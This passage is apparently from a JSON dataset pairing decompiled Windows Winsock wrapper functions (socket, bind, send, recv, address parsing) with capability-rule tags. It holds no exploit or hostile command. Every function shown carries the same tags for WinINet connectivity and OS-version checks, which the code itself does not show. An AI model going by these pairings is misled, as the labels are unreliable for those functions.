       if (iVar1 == 0) {\n                *arg_10h = iVar2;\n                uVar3 = 0x21590002;\n                goto code_r0x20021c3f;\n            }\n            if (iVar1 == -1) {\ncode_r0x20021c6e:\n                uVar3 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n                goto code_r0x20021c3f;\n            }\n            iVar1 = var_4h - iVar2;\n            if (0x10000 < iVar1) {\n                iVar1 = 0x10000;\n            }\n            iVar1 = (*_sym.imp.WS2_32.dll_recv)(*(arg_8h + 4), arg_ch, iVar1, 0);\n            if (iVar1 == -1) goto code_r0x20021c6e;\n            if (iVar1 == 0) {\n                uVar3 = 0x21590003;\n                goto code_r0x20021c3f;\n            }\n            if ((arg_18h & 1) == 0) {\n                *arg_10h = iVar1;\n                goto code_r0x20021c3d;\n            }\n            arg_ch = arg_ch + iVar1;\n            iVar2 = iVar2 + iVar1;\n            if ((var_8h != 0) && (*(arg_8h + 0x144) != NULL)) {\n                (**(arg_8h + 0x144))(*(arg_8h + 0x138), \"TCP: recv\", iVar2, var_4h, &var_ch);\n            }\n        } while (iVar2 < var_4h);\n    }\n    *arg_10h = iVar2;\ncode_r0x20021c3d:\n    uVar3 = 0;\ncode_r0x20021c3f:\n    if ((var_8h != 0) && (*(arg_8h + 0x140) != NULL)) {\n        (**(arg_8h + 0x140))(*(arg_8h + 0x138), 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 897
    },
    "20021ce8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.20021ce8(int32_t *arg_8h, uint noname_1, int32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, \n            uint32_t arg_20h)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t var_4h;\n    \n    iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x158);\n    if (iVar2 == 0) {\n        return 0x21590004;\n    }\n    sub.ntdll.dll_memset(iVar2, 0, 0x158);\n    fcn.20001551(iVar2 + 0x120);\n    *(iVar2 + 4) = 0xffffffff;\n    var_4h = 0x21590064;\n    if (arg_18h == 0) {\ncode_r0x20021d8c:\n        if (arg_10h == 0) {\n            *(iVar2 + 0x118) = 0xffffffff;\n        }\n        else {\n            piVar1 = iVar2 + 0x90;\n            var_4h = fcn.200234f8(arg_10h, arg_14h, arg_20h & 1, piVar1, iVar2 + 0x110);\n            if (var_4h == 0) {\n                if (*(iVar2 + 4) == -1) {\n                    uVar4 = (*_sym.imp.WS2_32.dll_socket)(*piVar1, 1, 0);\n                    *(iVar2 + 4) = uVar4;\n                    *(iVar2 + 8) = *piVar1;\n                }\n                fcn.20021cb5(*(iVar2 + 4));\n                var_4h = (*_sym.imp.WS2_32.dll_bind)(*(iVar2 + 4), piVar1, *(iVar2 + 0x110));\n                if (var_4h == -1) goto code_r0x20021d79;\n            }\n        }\n        if (*(iVar2 + 4) != -1) {\n            if (var_4h != 0) goto code_r0x20021e17;\n            *arg_8h = iVar2;\n        }\n        if (var_4h == 0) {\n            return 0;\n        }\n    }\n    else {\n        piVar1 = iVar2 + 0x10;\n        var_4h = fcn.200234f8(arg_18h, arg_1ch, arg_20h & 2, piVar1, iVar2 + 0x114);\n        if (var_4h != 0) goto code_r0x20021e17;\n        iVar3 = (*_sym.imp.WS2_32.dll_socket)(*piVar1, 1, 0);\n        *(iVar2 + 4) = iVar3;\n        if (iVar3 != -1) {\n            *(iVar2 + 8) = *piVar1;\n            goto code_r0x20021d8c;\n        }\ncode_r0x20021d79:\n        var_4h = 0x21590009;\n    }\ncode_r0x20021e17:\n    iVar3 = *(iVar2 + 4);\n    if ((iVar3 != 0) && (iVar3 != -1)) {\n        (*_sym.imp.WS2_32.dll_closesocket)(iVar3);\n    }\n    fcn.2000155c(iVar2 + 0x120);\n    (*_sym.imp.msvcrt.dll_free)(iVar2);\n    return var_4h;\n}\n",
        "token_count": 821
    },
    "200220f7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.200220f7(int32_t arg_8h, int32_t buf, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    uVar4 = arg_14h & 0x10000000;\n    if (uVar4 == 0) {\n        fcn.20001567(arg_8h + 0x30);\n    }\n    pcVar1 = _sym.imp.WS2_32.dll_send;\n    if (arg_10h < 0x2001) {\n        iVar2 = (*_sym.imp.WS2_32.dll_send)(*(arg_8h + 4), buf, arg_10h, 0);\n        if (uVar4 == 0) {\n            fcn.2000157d(arg_8h + 0x30);\n        }\n        if (iVar2 == -1) {\n            uVar3 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n        }\n        else {\n            uVar3 = 0;\n        }\n    }\n    else {\n        arg_14h = arg_10h;\n        do {\n            iVar2 = (*pcVar1)(*(arg_8h + 4), buf, 0x2000, 0);\n            if (iVar2 == -1) goto code_r0x2002219c;\n            arg_14h = arg_14h + -0x2000;\n            buf = buf + 0x2000;\n            var_4h = var_4h + 0x2000;\n        } while (0x1fff < arg_14h);\n        uVar3 = 0;\n        if ((0 < arg_10h - var_4h) && (iVar2 = (*pcVar1)(*(arg_8h + 4), buf, arg_10h - var_4h, 0),  iVar2 == -1)) {\ncode_r0x2002219c:\n            uVar3 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n        }\n        if (uVar4 == 0) {\n            fcn.2000157d(arg_8h + 0x30);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 546
    },
    "20022490": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.20022490(int32_t *arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            uint32_t arg_20h)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint var_28h;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x58);\n    var_1h._0_1_ = 1;\n    if (iVar2 == 0) {\n        return 0x21590004;\n    }\n    sub.ntdll.dll_memset(iVar2, 0, 0x58);\n    fcn.20001551(iVar2 + 0x30);\n    iVar3 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 6);\n    *(iVar2 + 4) = iVar3;\n    if (iVar3 == -1) {\ncode_r0x200224e0:\n        iVar3 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n    }\n    else {\n        if (arg_10h == 0) {\n            *(iVar2 + 0x18) = 0xffffffff;\n        }\n        else {\n            if ((arg_20h & 1) == 0) {\n                if (arg_14h != 0x10) goto code_r0x200225b4;\n                sub.ntdll.dll_memcpy(&var_18h, arg_10h, 0x10);\n            }\n            else {\n                if ((*(arg_10h + -1 + arg_14h) != '\\0') ||\n                   (iVar3 = sub.ntdll.dll_strlen(arg_10h),  iVar3 + 1 != arg_14h)) {\ncode_r0x200225b4:\n                    iVar3 = 0x21590067;\n                    goto code_r0x20022722;\n                }\n                sub.ntdll.dll_memset(&var_18h, 0, 0x10);\n                var_18h._0_2_ = 2;\n                var_8h = (*_sym.imp.ntdll.dll_strchr)(arg_10h, 0x3a);\n                if (var_8h == 0) {\n                    var_8h = arg_10h;\n                }\n                else {\n                    uVar4 = 0xf;\n                    if (var_8h - arg_10h < 0x10) {\n                        uVar4 = var_8h - arg_10h;\n                    }\n                    sub.ntdll.dll_memcpy(&var_28h, arg_10h, uVar4);\n                    *(&var_28h + uVar4) = 0;\n                    var_14h = (*_sym.imp.WS2_32.dll_inet_addr)(&var_28h);\n                    if (var_14h == -1) {\n                        iVar3 = 0x215900c9;\n                        goto code_r0x20022722;\n                    }\n                    var_8h = var_8h + 1;\n                }\n                iVar3 = (*_sym.imp.ntdll.dll_atoi)(var_8h);\n                if (0xfffe < iVar3 - 1U) {\n                    iVar3 = 0x215900ca;\n                    goto code_r0x20022722;\n                }\n                var_18h._2_2_ = (*_sym.imp.WS2_32.dll_htons)(iVar3);\n            }\n            (*_sym.imp.WS2_32.dll_setsockopt)(*(iVar2 + 4), 0xffff, 4, &var_1h, 1);\n            iVar3 = (*_sym.imp.WS2_32.dll_bind)(*(iVar2 + 4), &var_18h, 0x10);\n            if (iVar3 == -1) goto code_r0x200224e0;\n        }\n        if (arg_18h != 0) {\n            if ((arg_20h & 2) == 0) {\n                if (arg_1ch == 0x10) {\n                    sub.ntdll.dll_memcpy(iVar2 + 8, arg_18h, 0x10);\n                    goto code_r0x20022708;\n                }\n            }\n            else if ((*(arg_18h + -1 + arg_1ch) == '\\0') &&\n                    (iVar3 = sub.ntdll.dll_strlen(arg_18h),  iVar3 + 1 == arg_1ch)) {\n                *(iVar2 + 8) = 2;\n                var_8h = (*_sym.imp.ntdll.dll_strchr)(arg_18h, 0x3a);\n                if (var_8h != 0) {\n                    iVar5 = var_8h - arg_18h;\n                    iVar3 = (*_sym.imp.msvcrt.dll_malloc)(iVar5 + 1);\n                    if (iVar3 == 0) {\n                        iVar3 = 0x21590004;\n                        goto code_r0x20022722;\n                    }\n                    sub.ntdll.dll_memcpy(iVar3, arg_18h, iVar5);\n                    *(iVar3 + iVar5) = 0;\n                    iVar5 = (*_sym.imp.WS2_32.dll_inet_addr)(iVar3);\n                    *(iVar2 + 0xc) = iVar5;\n                    if (iVar5 == -1) {\n                        iVar5 = (*_sym.imp.WS2_32.dll_gethostbyname)(iVar3);\n                        if (iVar5 == 0) {\n                            (*_sym.imp.msvcrt.dll_free)(iVar3);\n                            goto code_r0x200224e0;\n                        }\n                        *(iVar2 + 0xc) = ***(iVar5 + 0xc);\n                    }\n                    (*_sym.imp.msvcrt.dll_free)(iVar3);\n                    iVar3 = (*_sym.imp.ntdll.dll_atoi)(var_8h + 1);\n                    if (iVar3 - 1U < 0xffff) {\n                        uVar1 = (*_sym.imp.WS2_32.dll_htons)(iVar3);\n                        *(iVar2 + 10) = uVar1;\n                        goto code_r0x20022708;\n                    }\n                }\n                iVar3 = 0x215900cc;\n                goto code_r0x20022722;\n            }\n            iVar3 = 0x21590069;\n            goto code_r0x20022722;\n        }\ncode_r0x20022708:\n        iVar3 = 0;\n        fcn.20021fef(iVar2, \"nodelay=1\", 0);\n        *arg_8h = iVar2;\n    }\n    if (iVar3 == 0) {\n        return 0;\n    }\ncode_r0x20022722:\n    iVar5 = *(iVar2 + 4);\n    if ((iVar5 != 0) && (iVar5 != -1)) {\n        (*_sym.imp.WS2_32.dll_closesocket)(iVar5);\n    }\n    fcn.2000155c(iVar2 + 0x30);\n    (*_sym.imp.msvcrt.dll_free)(iVar2);\n    return iVar3;\n}\n",
        "token_count": 1651
    },
    "20022909": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.20022909(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t **unaff_EDI;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_InterlockedDecrement;\n    piVar2 = *unaff_EDI;\n    piVar1 = piVar2 + 3;\n    if ((0 < *piVar1) && (iVar4 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(piVar1),  iVar4 == 0)) {\n        fcn.200139c9(unaff_EDI, 5);\n        (**(**unaff_EDI + 0x14))();\n        (*_sym.imp.msvcrt.dll_free)(piVar2);\n        (*pcVar3)(0x200470c4);\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "20022949": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.20022949(int32_t **param_1, int32_t param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    ppiVar1 = *param_1;\n    fcn.20001567(0x200470c8);\n    iVar3 = fcn.20013a3e(ppiVar1, 5);\n    if ((iVar3 == 0) || (piVar2 = *ppiVar1,  piVar2[1] != 0)) {\n        fcn.2000157d(0x200470c8);\n    }\n    else {\n        piVar2[2] = param_2;\n        piVar2[1] = 1;\n        fcn.2000157d(0x200470c8);\n        (**(**ppiVar1 + 0x10))(ppiVar1, param_2);\n        fcn.20022909();\n    }\n    *param_1 = NULL;\n    return;\n}\n",
        "token_count": 229
    },
    "200229da": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.200229da(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    fcn.20001567(0x200470c8);\n    iVar1 = fcn.20013a3e();\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else if (*(*in_EAX + 4) == 0) {\n        fcn.200228fc();\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 0x21590006;\n    }\n    fcn.2000157d(0x200470c8);\n    return uVar2;\n}\n",
        "token_count": 161
    },
    "20022a23": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.20022a23(int32_t **arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h, uint *arg_18h, uint arg_1ch, \n            uint32_t arg_20h)\n\n{\n    code *pcVar1;\n    int32_t var_4h;\n    \n    var_4h = fcn.200229da();\n    if (var_4h == 0) {\n        if ((***arg_8h < 0x19) || (pcVar1 = (**arg_8h)[6],  pcVar1 == NULL)) {\n            fcn.20022909();\n            var_4h = 0x21590001;\n        }\n        else {\n            var_4h = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if (((var_4h != 0) || ((arg_20h & 2) != 0)) || (*arg_14h == 0)) {\n                if ((*arg_8h)[1] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.20022909();\n                *arg_14h = 0;\n                *arg_18h = 0;\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 321
    },
    "20022aa3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20022aa3(uint arg_8h, uint *arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    int32_t **in_EAX;\n    int32_t iVar2;\n    int32_t *unaff_ESI;\n    \n    iVar2 = fcn.200229da();\n    if (iVar2 == 0) {\n        if ((***in_EAX < 0x1d) || (pcVar1 = (**in_EAX)[7],  pcVar1 == NULL)) {\n            fcn.20022909();\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)();\n            if (((iVar2 != 0) || ((arg_14h & 2) != 0)) || (*unaff_ESI == 0)) {\n                if ((*in_EAX)[1] != 0) {\n                    iVar2 = 0x21590006;\n                }\n                fcn.20022909();\n                *unaff_ESI = 0;\n                *arg_ch = 0;\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 261
    },
    "20022b99": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.20022b99(int32_t **param_1, uint param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.200229da();\n    if (iVar2 == 0) {\n        if ((***param_1 < 0x29) || (pcVar1 = (**param_1)[10],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(param_1, param_2, param_3);\n            if ((iVar2 != 0) && ((*param_1)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20022909();\n    }\n    return iVar2;\n}\n",
        "token_count": 190
    },
    "20022c43": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20022c43(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.200229da();\n    if (iVar2 == 0) {\n        if ((***arg_8h < 0x31) || (pcVar1 = (**arg_8h)[0xc],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((iVar2 != 0) && ((*arg_8h)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20022909();\n    }\n    return iVar2;\n}\n",
        "token_count": 220
    },
    "20022c9f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20022c9f(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.200229da();\n    if (iVar2 == 0) {\n        if ((***arg_8h < 0x35) || (pcVar1 = (**arg_8h)[0xd],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((iVar2 != 0) && ((*arg_8h)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20022909();\n    }\n    return iVar2;\n}\n",
        "token_count": 221
    },
    "20022d89": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.20022d89(int32_t **ptr, int32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint32_t arg_20h)\n\n{\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uchar *var_8h;\n    int32_t var_4h;\n    \n    ppiVar1 = ptr;\n    *ptr = NULL;\n    iVar2 = *arg_ch;\n    var_4h = 0;\n    piVar5 = arg_ch;\n    do {\n        if (iVar2 == 0) {\n            return 0x21590005;\n        }\n        iVar2 = (*_sym.imp.msvcrt.dll__strdup)(*piVar5);\n        if (iVar2 == 0) {\n            return 0x21590004;\n        }\n        var_8h = (*_sym.imp.ntdll.dll_strchr)(iVar2, 0x2e);\n        if (var_8h != NULL) {\n            *var_8h = 0;\n            var_8h = var_8h + 1;\n        }\n        iVar3 = fcn.20012fa6(iVar2, arg_20h);\n        if (iVar3 == 0) {\n            (*_sym.imp.msvcrt.dll_free)(iVar2);\n            if (*0x20046ecc != 0) {\n                ptr = (**(*0x20046ecc + 0xc))(ppiVar1, *piVar5, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n                if ((ptr == NULL) && (iVar3 = *0x20046ecc,  *0x20046ecc != 0)) goto code_r0x20022eab;\n                if (ptr != 0x21590005) {\n                    return ptr;\n                }\n                goto code_r0x20022e77;\n            }\n        }\n        else {\n            if (var_8h == NULL) {\n                iVar4 = sub.ntdll.dll_strlen(iVar2);\n            }\n            else {\n                iVar4 = var_8h - iVar2;\n            }\n            (*_sym.imp.msvcrt.dll_free)(iVar2);\n            ptr = (**(iVar3 + 0xc))(ppiVar1, *piVar5 + iVar4, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h & 0xfffeffff);\ncode_r0x20022e77:\n            if (iVar3 != 0) {\n                if (ptr != NULL) {\n                    return ptr;\n                }\ncode_r0x20022eab:\n                if (*ppiVar1 == NULL) {\n                    (**(iVar3 + 0x10))(0, 0);\n                    (**(iVar3 + 0x14))(*ppiVar1, 0);\n                    return -1;\n                }\n                piVar5 = (*_sym.imp.msvcrt.dll_malloc)(0x10);\n                if (piVar5 == NULL) {\n                    (**(iVar3 + 0x10))(*ppiVar1, 0);\n                    (**(iVar3 + 0x14))(*ppiVar1, 0);\n                    *ppiVar1 = NULL;\n                }\n                else {\n                    piVar5[1] = 0;\n                    piVar5[2] = 0;\n                    *piVar5 = iVar3;\n                    piVar5[3] = 1;\n                    **ppiVar1 = piVar5;\n                    iVar2 = fcn.2001396b(*ppiVar1, 1);\n                    if (iVar2 != 0) {\n                        (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(0x200470e0);\n                        return ptr;\n                    }\n                    (*_sym.imp.msvcrt.dll_free)(piVar5);\n                    (**(iVar3 + 0x10))(*ppiVar1, 0);\n                    (**(iVar3 + 0x14))(*ppiVar1, 0);\n                    *ppiVar1 = NULL;\n                }\n                return 0x21590004;\n            }\n        }\n        var_4h = var_4h + 1;\n        piVar5 = arg_ch + var_4h;\n        iVar2 = *piVar5;\n    } while( true );\n}\n",
        "token_count": 977
    },
    "20022f3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.20022f3c(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t **unaff_EDI;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_InterlockedDecrement;\n    piVar2 = *unaff_EDI;\n    piVar1 = piVar2 + 3;\n    if ((0 < *piVar1) && (iVar4 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(piVar1),  iVar4 == 0)) {\n        fcn.200139c9(unaff_EDI, 1);\n        (**(**unaff_EDI + 0x14))();\n        (*_sym.imp.msvcrt.dll_free)(piVar2);\n        (*pcVar3)(0x200470e0);\n    }\n    return;\n}\n",
        "token_count": 200
    },
    "20022f7c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.20022f7c(int32_t **param_1, int32_t param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    ppiVar1 = *param_1;\n    fcn.20001567(0x200470e4);\n    iVar3 = fcn.20013a3e(ppiVar1, 1);\n    if ((iVar3 == 0) || (piVar2 = *ppiVar1,  piVar2[1] != 0)) {\n        fcn.2000157d(0x200470e4);\n    }\n    else {\n        piVar2[2] = param_2;\n        piVar2[1] = 1;\n        fcn.2000157d(0x200470e4);\n        (**(**ppiVar1 + 0x10))(ppiVar1, param_2);\n        fcn.20022f3c();\n    }\n    *param_1 = NULL;\n    return;\n}\n",
        "token_count": 233
    },
    "20022fde": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.20022fde(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    fcn.20001567(0x200470e4);\n    iVar1 = fcn.20013a3e();\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else if (*(*in_EAX + 4) == 0) {\n        fcn.200228fc();\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 0x21590006;\n    }\n    fcn.2000157d(0x200470e4);\n    return uVar2;\n}\n",
        "token_count": 162
    },
    "20023027": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20023027(int32_t **arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t var_4h;\n    \n    var_4h = fcn.20022fde();\n    if (var_4h == 0) {\n        if ((***arg_8h < 0x1d) || (pcVar1 = (**arg_8h)[7],  pcVar1 == NULL)) {\n            fcn.20022f3c();\n            var_4h = 0x21590001;\n        }\n        else {\n            var_4h = (*pcVar1)(arg_8h, arg_ch, arg_10h);\n            if (var_4h == 0) {\n                piVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x10);\n                if (piVar2 == NULL) {\n                    fcn.20022f3c();\n                    (**(**arg_8h + 0x14))(*arg_ch, 0);\n                    *arg_ch = 0;\n                    return 0x21590004;\n                }\n                iVar3 = **arg_8h;\n                piVar2[1] = 0;\n                piVar2[2] = 0;\n                *piVar2 = iVar3;\n                piVar2[3] = 1;\n                **arg_ch = piVar2;\n                iVar3 = fcn.2001396b(*arg_ch, 1);\n                if (iVar3 == 0) {\n                    (*_sym.imp.msvcrt.dll_free)(piVar2);\n                    (**(**arg_8h + 0x14))(*arg_ch, 0);\n                    *arg_ch = 0;\n                    var_4h = 0x21590004;\n                }\n                else {\n                    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(0x200470e0);\n                }\n            }\n            else if ((*arg_8h)[1] != 0) {\n                var_4h = 0x21590006;\n            }\n            fcn.20022f3c();\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 498
    },
    "2002323c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.2002323c(int32_t **param_1, uint param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.20022fde();\n    if (iVar2 == 0) {\n        if ((***param_1 < 0x25) || (pcVar1 = (**param_1)[9],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(param_1, param_2, param_3);\n            if ((iVar2 != 0) && ((*param_1)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20022f3c();\n    }\n    return iVar2;\n}\n",
        "token_count": 193
    },
    "20023291": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.20023291(int32_t **param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.20022fde();\n    if (iVar2 == 0) {\n        if ((***param_1 < 0x29) || (pcVar1 = (**param_1)[10],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(param_1, param_2, param_3, param_4);\n            if ((iVar2 != 0) && ((*param_1)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20022f3c();\n    }\n    return iVar2;\n}\n",
        "token_count": 201
    },
    "200232ea": {
        "rules": [
